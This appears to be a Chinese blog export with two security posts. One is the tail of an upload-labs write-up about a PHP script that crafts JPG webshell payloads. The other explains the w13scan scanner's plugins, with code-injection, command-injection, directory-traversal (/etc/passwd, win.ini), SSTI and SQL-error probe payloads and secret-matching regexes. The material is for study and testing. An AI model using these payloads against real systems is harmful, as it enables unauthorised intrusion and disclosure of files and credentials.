class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<ol>
<li>先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。</li>
<li>将保存下来经过服务器二次渲染的那张jpg图片，用此脚本进行处理生成payload.jpg</li>
<li>然后再上传payload.jpg</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">php.exe jpg_payload.php 2013.jpg</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306161437.png" alt="20210306161437"></p>
<p>换了几个图片,还是无法正常解析。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210306161607.png" alt="20210306161607"></p>
<hr>
<h1 id="图片马结合文件包含漏洞"><a href="#图片马结合文件包含漏洞" class="headerlink" title="图片马结合文件包含漏洞:"></a>图片马结合文件包含漏洞:</h1><p><a href="https://blog.csdn.net/qq_42311391/article/details/89477993">关于图片马的正确用法</a></p>
<p>文件包含漏洞简单说就是，在这个include.php中需要引用其他应用程序，php中应用程序文件是.php也就是说，他本来想引用一个php文件，但是漏洞就是，他不会识别什么是php文件，<strong>只要是他引用的，他都当php来解析</strong>，所以如果他引用的是jpg，但是jpg中有图片马，那么他就相当于引用了图片马，同样的道理还会有zip马等等</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://choge.top/2020/02/24/upload-labs%E8%AE%B0%E5%BD%95/">upload-labs记录</a></li>
<li><a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析</a></li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>w13scan-扫描插件总结-PerFile</title>
    <url>//24549.html</url>
    <content><![CDATA[<h1 id="整体流程图"><a href="#整体流程图" class="headerlink" title="整体流程图"></a>整体流程图</h1><p><img src="https://i.loli.net/2019/12/17/b27hPyBAzm3vN5g.png" alt="W13SCAN-DESIGN.jpg"></p>
<hr>
<h2 id="PerFile-每个文件"><a href="#PerFile-每个文件" class="headerlink" title="PerFile (每个文件)"></a>PerFile (每个文件)</h2><h3 id="序列化参数分析"><a href="#序列化参数分析" class="headerlink" title="序列化参数分析"></a>序列化参数分析</h3><blockquote>
<p>如果参数中包含反序列化的参数就会被识别出来，反序列化的参数如果没有做好过滤会有很大危害。</p>
</blockquote>
<p>里面有3个函数:</p>
<ol>
<li><code>isJavaObjectDeserialization()</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关键代码</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">bytes</span>(ret).startswith(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;ac ed 00 05&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>在识别Java序列化特征时，人们经常说要寻找4字节的特征序列：<code>0xAC ED 00 05</code>，事实上某些IDS规则也是根据这个特征来识别此类攻击。</p>
</blockquote>
<ol start="2">
<li><code>isPHPObjectDeserialization()</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关键代码</span></span><br><span class="line"><span class="keyword">if</span> value.startswith(<span class="string">&quot;O:&quot;</span>) <span class="keyword">or</span> value.startswith(<span class="string">&quot;a:&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&#x27;^[O]:\d+:&quot;[^&quot;]+&quot;:\d+:&#123;.*&#125;&#x27;</span>, value) <span class="keyword">or</span> re.match(<span class="string">&#x27;^a:\d+:&#123;(s:\d:&quot;[^&quot;]+&quot;;|i:\d+;).*&#125;&#x27;</span>, value):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="keyword">elif</span> (value.startswith(<span class="string">&quot;Tz&quot;</span>) <span class="keyword">or</span> value.startswith(<span class="string">&quot;YT&quot;</span>)) <span class="keyword">and</span> is_base64(value):</span><br><span class="line">    ret = is_base64(value)</span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">&#x27;^[O]:\d+:&quot;[^&quot;]+&quot;:\d+:&#123;.*&#125;&#x27;</span>, value) <span class="keyword">or</span> re.match(<span class="string">&#x27;^a:\d+:&#123;(s:\d:&quot;[^&quot;]+&quot;;|i:\d+;).*&#125;&#x27;</span>, ret):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>




<ol start="3">
<li><code>isPythonObjectDeserialization</code></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关键代码</span></span><br><span class="line"><span class="comment"># pickle binary</span></span><br><span class="line"><span class="keyword">if</span> value.startswith(<span class="string">&quot;g&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span>(ret).startswith(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;8003&quot;</span>)) <span class="keyword">and</span> ret.endswith(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pickle text versio</span></span><br><span class="line"><span class="keyword">elif</span> value.startswith(<span class="string">&quot;K&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> (ret.startswith(<span class="string">&quot;(dp1&quot;</span>) <span class="keyword">or</span> ret.startswith(<span class="string">&quot;(lp1&quot;</span>)) <span class="keyword">and</span> ret.endswith(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Python 的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</p>
</blockquote>
<p>原理:根据序列化后参数的<strong>字节的特征序列</strong></p>
<hr>
<h3 id="asp代码执行"><a href="#asp代码执行" class="headerlink" title="asp代码执行"></a>asp代码执行</h3><p>暂只支持Get请求方式和回显型的ASP代码注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="string">&#x27;response.write(&#123;&#125;*&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(randint1, randint2),</span><br><span class="line">    <span class="string">&#x27;\&#x27;+response.write(&#123;&#125;*&#123;&#125;)+\&#x27;&#x27;</span>.<span class="built_in">format</span>(randint1, randint2),</span><br><span class="line">    <span class="string">&#x27;&quot;response.write(&#123;&#125;*&#123;&#125;)+&quot;&#x27;</span>.<span class="built_in">format</span>(randint1, randint2),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><code>response.write()</code>函数相当于<code>print()</code>,上面的payload就是输出随机字符</p>
<p>原理:</p>
<p>某个参数点如果能执行我们payload里的输出函数,输出一个我们自己定义的随机字符，则认为有代码注入</p>
<hr>
<h3 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行"></a>php代码执行</h3><p>暂只支持Get请求方式和回显型的PHP代码注入以及cookie中的代码注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;print(md5(&#123;&#125;));&quot;</span>,</span><br><span class="line">    <span class="string">&quot;;print(md5(&#123;&#125;));&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;;print(md5(&#123;&#125;));$a=&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\&quot;;print(md5(&#123;&#125;));$a=\&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;&#123;@print(md5(&#123;&#125;))&#125;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;&#123;@print(md5(&#123;&#125;))&#125;&#125;\\&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;.print(md5(&#123;&#125;)).&#x27;&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>原理:同上</p>
<hr>
<h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><p>测试系统命令注入，支持Windows&#x2F;Linux,暂只支持Get请求方式和回显型的命令注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_flag = &#123;</span><br><span class="line">            <span class="string">&quot;set|set&amp;set&quot;</span>: [</span><br><span class="line">                <span class="string">&#x27;Path=[\s\S]*?PWD=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path=[\s\S]*?PATHEXT=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path=[\s\S]*?SHELL=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path\x3d[\s\S]*?PWD\x3d&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path\x3d[\s\S]*?PATHEXT\x3d&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Path\x3d[\s\S]*?SHELL\x3d&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Non-authoritative\sanswer:\s+Name:\s*&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Server:\s*.*?\nAddress:\s*&#x27;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;echo `echo 6162983|base64`6162983&quot;</span>.<span class="built_in">format</span>(randint): [</span><br><span class="line">                <span class="string">&quot;NjE2Mjk4Mwo=6162983&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>key<code>&quot;set|set&amp;set&quot;</code>这个是payload是系统的一个命令</p>
<blockquote>
<p>set指令能设置所使用shell的执行方式，可依照不同的需求来做设置。</p>
</blockquote>
<p>value<code>&#39;Path=[\s\S]*?PWD=&#39;</code>这个是正则表达式。</p>
<hr>
<h3 id="cors检测"><a href="#cors检测" class="headerlink" title="cors检测"></a>cors检测</h3><p>寻找CORS能否利用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;access-control-allow-origin&quot;</span> <span class="keyword">in</span> resp_headers <span class="keyword">and</span> resp_headers[<span class="string">&quot;access-control-allow-origin&quot;</span>] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">   <span class="keyword">if</span> <span class="string">&quot;access-control-allow-credentials&quot;</span> <span class="keyword">in</span> resp_headers <span class="keyword">and</span> resp_headers[<span class="string">&quot;access-control-allow-credentials&quot;</span>].lower() == <span class="string">&#x27;true&#x27;</span>:</span><br><span class="line">       out.success(url, self.name, payload=<span class="built_in">str</span>(data), method=method)</span><br></pre></td></tr></table></figure>

<p>原理:识别返回包header中的特征</p>
<hr>
<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>通过url特征判断系统的指纹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> filepath.endswith(<span class="string">&quot;.aspx&quot;</span>) <span class="keyword">or</span> filepath.endswith(<span class="string">&quot;.asp&quot;</span>): <span class="comment"># 有.aspx和.asp</span></span><br><span class="line">    isunix = <span class="number">2</span>   <span class="comment"># 不是unix</span></span><br><span class="line">    iswin = <span class="number">1</span>    <span class="comment"># 肯定是win</span></span><br><span class="line">    isjava = <span class="number">2</span>   <span class="comment"># 不是java</span></span><br><span class="line"><span class="keyword">if</span> filepath.endswith(<span class="string">&quot;.jsp&quot;</span>):<span class="comment"># 有.jsp</span></span><br><span class="line">    isjava = <span class="number">1</span>   <span class="comment"># 肯定是java</span></span><br></pre></td></tr></table></figure>

<p>根据不同平台来发包的字典:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="number">1</span> &gt;= isunix &gt;= <span class="number">0</span>:  <span class="comment"># Unix平台</span></span><br><span class="line">    payloads.append(<span class="string">&quot;../../../../../../../../../../etc/passwd&quot;</span>)</span><br><span class="line">    payloads.append(<span class="string">&quot;/etc/passwd&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> origin:</span><br><span class="line">        payloads.append(dirname + <span class="string">&quot;/../../../../../../../../../../etc/passwd&quot;</span>)</span><br><span class="line">        payloads.append(dirname + <span class="string">&quot;/../../../../../../../../../../etc/passwd&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            unquote(<span class="string">&quot;%00&quot;</span>) + default_extension))</span><br><span class="line">    payloads.append(<span class="string">&quot;../../../../../../../../../../etc/passwd&#123;&#125;&quot;</span>.<span class="built_in">format</span>(unquote(<span class="string">&quot;%00&quot;</span>)))</span><br><span class="line">    payloads.append(</span><br><span class="line">        <span class="string">&quot;../../../../../../../../../../etc/passwd&#123;&#125;&quot;</span>.<span class="built_in">format</span>(unquote(<span class="string">&quot;%00&quot;</span>)) + default_extension)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &gt;= iswin &gt;= <span class="number">0</span>:   <span class="comment"># wins平台</span></span><br><span class="line">    payloads.append(<span class="string">&quot;../../../../../../../../../../windows/win.ini&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> origin:</span><br><span class="line">        payloads.append(dirname + <span class="string">&quot;/../../../../../../../../../../windows/win.ini&quot;</span>)</span><br><span class="line">    payloads.append(<span class="string">&quot;C:\\WINDOWS\\system32\\drivers\\etc\\hosts&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1</span> &gt;= isjava &gt;= <span class="number">0</span>:  <span class="comment"># java语言</span></span><br><span class="line">    payloads.append(<span class="string">&quot;/WEB-INF/web.xml&quot;</span>)</span><br><span class="line">    payloads.append(<span class="string">&quot;../../WEB-INF/web.xml&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>判断返回包有目录穿越的规则:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plainArray = [     <span class="comment"># 字符串特征</span></span><br><span class="line">    <span class="string">&quot;; for 16-bit app support&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[MCI Extensions.BAK]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;# localhost name resolution is handled within DNS itself.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[boot loader]&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">regexArray = [      <span class="comment"># 正则表达式</span></span><br><span class="line">    <span class="string">&#x27;(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(root:.*:.*:)&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;System\.IO\.FileNotFoundException: Could not find file\s&#x27;\w:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s&#x27;\w:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&lt;b&gt;Warning&lt;\/b&gt;:\s\sDOMDocument::load\(\)\s\[&lt;a\shref=&#x27;domdocument.load&#x27;&gt;domdocument.load&lt;\/a&gt;\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s&lt;b&gt;.*?&lt;\/b&gt;\son\sline\s&lt;b&gt;\d+&lt;\/b&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;(&lt;web-app[\s\S]+&lt;\/web-app&gt;)&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>


<hr>
<h3 id="模板表达式注入"><a href="#模板表达式注入" class="headerlink" title="模板表达式注入"></a>模板表达式注入</h3><p>服务端模板注入SSTI,对GET请求参数进行相关测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payloads = &#123;</span><br><span class="line">                <span class="string">&quot;&#123;ranstr&#125;$&#123;&#123;&#123;int1&#125;*&#123;int2&#125;&#125;&#125;&#123;ranstr&#125;&quot;</span>.<span class="built_in">format</span>(ranstr=randstr, int1=randint1, int2=randint2),</span><br><span class="line">                <span class="string">&quot;&#123;ranstr&#125;#&#123;&#123;&#123;int1&#125;*&#123;int2&#125;&#125;&#125;&#123;ranstr&#125;&quot;</span>.<span class="built_in">format</span>(ranstr=randstr, int1=randint1, int2=randint2)</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 Twig 模板引擎里,   除了可以输出传递的变量以外,还能<strong>执行一些基本的表达式然后将其结果作为该模板变量的值</strong>,例如这里用户输入 name&#x3D;20 ,则在服务端拼接的模版内容为:<br><img src="https://i.loli.net/2019/12/30/TbMXmH87tdzeUQc.png" alt="20191230202751.png"></p>
</blockquote>
<p>原理:</p>
<ul>
<li>利用模板引擎能执行一些基本的表达式</li>
<li>前后加随机字符串是为了减少误报</li>
</ul>
<hr>
<h3 id="js敏感文件探测"><a href="#js敏感文件探测" class="headerlink" title="js敏感文件探测"></a>js敏感文件探测</h3><p>从返回js的包中匹配敏感内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">regx = (</span><br><span class="line">        <span class="comment"># 匹配url</span></span><br><span class="line">        <span class="string">r&#x27;(\b|\&#x27;|&quot;)(?:http:|https:)(?:[\w/\.]+)?(?:[a-zA-Z0-9_\-\.]&#123;1,&#125;)\.(?:php|asp|ashx|jspx|aspx|jsp|json|action|html|txt|xml|do)(\b|\&#x27;|&quot;)&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配邮箱</span></span><br><span class="line">        <span class="string">r&#x27;[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(?:\.[a-zA-Z0-9_-]+)+&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配token或者密码泄露</span></span><br><span class="line">        <span class="comment"># 例如token = xxxxxxxx, 或者&quot;apikey&quot; : &quot;xssss&quot;</span></span><br><span class="line">        <span class="string">r&#x27;\b(?:secret|secret_key|token|secret_token|auth_token|access_token|username|password|aws_access_key_id|aws_secret_access_key|secretkey|authtoken|accesstoken|access-token|authkey|client_secret|bucket|email|HEROKU_API_KEY|SF_USERNAME|PT_TOKEN|id_dsa|clientsecret|client-secret|encryption-key|pass|encryption_key|encryptionkey|secretkey|secret-key|bearer|JEKYLL_GITHUB_TOKEN|HOMEBREW_GITHUB_API_TOKEN|api_key|api_secret_key|api-key|private_key|client_key|client_id|sshkey|ssh_key|ssh-key|privatekey|DB_USERNAME|oauth_token|irc_pass|dbpasswd|xoxa-2|xoxrprivate-key|private_key|consumer_key|consumer_secret|access_token_secret|SLACK_BOT_TOKEN|slack_api_token|api_token|ConsumerKey|ConsumerSecret|SESSION_TOKEN|session_key|session_secret|slack_token|slack_secret_token|bot_access_token|passwd|api|eid|sid|api_key|apikey|userid|user_id|user-id)[&quot;\s]*(?::|=|=:|=&gt;)[&quot;\s]*[a-z0-9A-Z]&#123;8,64&#125;&quot;?&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配IP地址</span></span><br><span class="line">        <span class="string">r&#x27;\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)&#123;3&#125;(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配云泄露</span></span><br><span class="line">        <span class="string">r&#x27;[\w]+\.cloudfront\.net&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;[\w\-.]+\.appspot\.com&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;[\w\-.]*s3[\w\-.]*\.?amazonaws\.com\/?[\w\-.]*&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;([\w\-.]*\.?digitaloceanspaces\.com\/?[\w\-.]*)&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;(storage\.cloud\.google\.com\/[\w\-.]+)&#x27;</span>,</span><br><span class="line">        <span class="string">r&#x27;([\w\-.]*\.?storage.googleapis.com\/?[\w\-.]*)&#x27;</span>,</span><br><span class="line">        <span class="comment"># 匹配手机号</span></span><br><span class="line">        <span class="string">r&#x27;(?:139|138|137|136|135|134|147|150|151|152|157|158|159|178|182|183|184|187|188|198|130|131|132|155|156|166|185|186|145|175|176|133|153|177|173|180|181|189|199|170|171)[0-9]&#123;8&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># 匹配域名</span></span><br><span class="line">        <span class="string">r&#x27;((?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]&#123;0,61&#125;[a-zA-Z0-9])?\.)+(?:biz|cc|club|cn|com|co|edu|fun|group|info|ink|kim|link|live|ltd|mobi|net|online|org|pro|pub|red|ren|shop|site|store|tech|top|tv|vip|wang|wiki|work|xin|xyz|me))&#x27;</span></span><br><span class="line"></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>


<hr>
<h3 id="jsonp探测"><a href="#jsonp探测" class="headerlink" title="jsonp探测"></a>jsonp探测</h3><hr>
<h3 id="通用敏感文件探测"><a href="#通用敏感文件探测" class="headerlink" title="通用敏感文件探测"></a>通用敏感文件探测</h3><p>从返回包中搜集通用的敏感信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phpinfo</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;title&gt;phpinfo()&lt;/title&gt;&quot;</span> <span class="keyword">in</span> resp_str:</span><br><span class="line">    info = get_phpinfo(resp_str)</span><br><span class="line">    out.success(url, self.name, info=info)</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="php真实路径检测"><a href="#php真实路径检测" class="headerlink" title="php真实路径检测"></a>php真实路径检测</h3><p>对于一些php网站，将正常参数替换为<code>[]</code>可能造成真实信息泄漏</p>
<p>篡改:正常参数替换为<code>[]</code></p>
<p>判断:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;Warning&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> <span class="string">&quot;array given&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    path = get_middle_text(r.text, <span class="string">&#x27;array given in &#x27;</span>, <span class="string">&#x27; on line&#x27;</span>)</span><br><span class="line">    out.success(_, self.name, path=path, raw=r.raw)</span><br></pre></td></tr></table></figure>



<hr>
<h3 id="重定向插件"><a href="#重定向插件" class="headerlink" title="重定向插件"></a>重定向插件</h3><p>支持检查 html meta 跳转、30x 跳转、JavaScript跳转等等</p>
<hr>
<h3 id="sql注入-基于报错"><a href="#sql注入-基于报错" class="headerlink" title="sql注入 (基于报错)"></a>sql注入 (基于报错)</h3><p>支持GET、COOKIE、HEADER头注入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sql_flag = <span class="string">&#x27;鎈\&#x27;&quot;\(&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这是sqli测试最简单的一种,就是用某个字符尝试去引起sql报错，然后回显在页面。</p>
